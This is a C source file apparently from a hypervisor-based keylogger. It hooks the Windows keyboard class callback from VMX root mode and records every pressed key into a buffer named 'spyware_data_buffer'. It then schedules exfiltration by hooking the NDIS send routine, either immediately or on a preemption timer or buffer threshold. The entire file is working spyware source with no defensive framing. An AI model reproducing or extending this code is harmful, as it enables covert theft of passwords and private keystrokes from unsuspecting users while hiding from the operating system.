#include <hooks/keyboard.h>
#include <vmm/vmm.h>
#include <vmm/vmcs.h>
#include <lib/instr.h>
#include <vmm/paging.h>
#include <lib/util.h>
#include <hooks/hooking.h>

__attribute__((section(".vmm"))) uint64_t locate_KeyboardClassServiceCallback(uint64_t kbdclass){
    byte_t sign[] = {
        0x48, 0x8b, 0x49, 0x40,     // mov rcx, qword ptr [rcx+40h]
        0x44, 0x8d, 0x4e, 0x32,     // lea r9d, [rsi+32h]
        0x44, 0x8d, 0x46, 0x03      // lea r8d,[rsi+3]
    };

    uint64_t KeyboardClassServiceCallback = find_signature(kbdclass, sign, 12) - 0x3b;

    return KeyboardClassServiceCallback;
}

__attribute__((section(".vmm"))) void handle_KeyboardClassServiceCallback_hook(vmexit_data_t *state){

    // Emulate PUSH RBP
    __vmwrite(GUEST_RSP, __vmread(GUEST_RSP)-8);
    uint64_t guest_stack = __vmread(GUEST_RSP);
    uint64_t guest_stack_phys = guest_virtual_to_physical(guest_stack);
    *(uint64_t*)guest_stack_phys = state->registers->rbp;
    KEYBOARD_INPUT_DATA *InputDataStart = state->registers->rdx;
    KEYBOARD_INPUT_DATA *InputDataEnd = state->registers->r8;

    char kbd_US [128] =
    {
        0,  27, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\b',   
    '\t', /* <-- Tab */
    'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',     
        0, /* <-- control key */
    'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',  0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/',   0,
    '*',
        0,  /* Alt */
    ' ',  /* Space bar */
        0,  /* Caps lock */
        0,  /* 59 - F1 key ... > */
        0,   0,   0,   0,   0,   0,   0,   0,
        0,  /* < ... F10 */
        0,  /* 69 - Num lock*/
        0,  /* Scroll Lock */
        0,  /* Home key */
        0,  /* Up Arrow */
        0,  /* Page Up */
    '-',
        0,  /* Left Arrow */
        0,
        0,  /* Right Arrow */
    '+',
        0,  /* 79 - End key*/
        0,  /* Down Arrow */
        0,  /* Page Down */
        0,  /* Insert Key */
        0,  /* Delete Key */
        0,   0,   0,
        0,  /* F11 Key */
        0,  /* F12 Key */
        0,  /* All other keys are undefined */
    };

    KEYBOARD_INPUT_DATA *data_phys;
    for (; InputDataStart < InputDataEnd; InputDataStart++){
        data_phys = guest_virtual_to_physical(InputDataStart);
        byte_t scancode = (byte_t)data_phys->MakeCode;
        
        if (data_phys->Flags == KEY_BREAK){
            if (scancode == SCANCODE_CTRL)
                scancode = SCANCODE_CTRL_RELEASED;
            else if (scancode == SCANCODE_RSHIFT || scancode == SCANCODE_LSHIFT)
                scancode = SCANCODE_SHIFT_RELEASED;
            else if (scancode == SCANCODE_ALT)
                scancode = SCANCODE_ALT_RELEASED;
            else continue;
        }
        else if (data_phys->Flags != KEY_MAKE) continue;

        AcquireLock(&shared_cores_data.spyware_data_lock);

        if (shared_cores_data.spyware_data_buffer.length >= MAX_BUFFER_LENGTH){
            ReleaseLock(&shared_cores_data.spyware_data_lock);
            return;
        } 

        LOG_INFO("Key pressed: %c\n", kbd_US[scancode]);
        shared_cores_data.spyware_data_buffer.chars[shared_cores_data.spyware_data_buffer.length] = scancode;
        shared_cores_data.spyware_data_buffer.length++;
        
        #if IMMEDIATE_SENDING
            shared_cores_data.send_pending = TRUE;
            hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
        #else
            // Activate preemption timer
            if (!shared_cores_data.send_pending){
                pin_based_ctls_t pin_based_ctls = {0};
                pin_based_ctls.value = __vmread(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS);

                if (!pin_based_ctls.activate_vmx_preemption_timer){
                    pin_based_ctls.activate_vmx_preemption_timer = TRUE;
                    __vmwrite(CONTROL_PIN_BASED_VM_EXECUTION_CONTROLS, pin_based_ctls.value);
                    __vmwrite(GUEST_VMX_PREEMPTION_TIMER, SEND_TIMER_TIME);
                }
            }

            // Send if buffer is almost full
            if (shared_cores_data.spyware_data_buffer.length >= 150){
                shared_cores_data.send_pending = TRUE;
                hook_function(guest_virtual_to_physical(shared_cores_data.functions.ndisMSendNBLToMiniportInternal), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
            } 
        #endif
        
        ReleaseLock(&shared_cores_data.spyware_data_lock);
    
    }

}

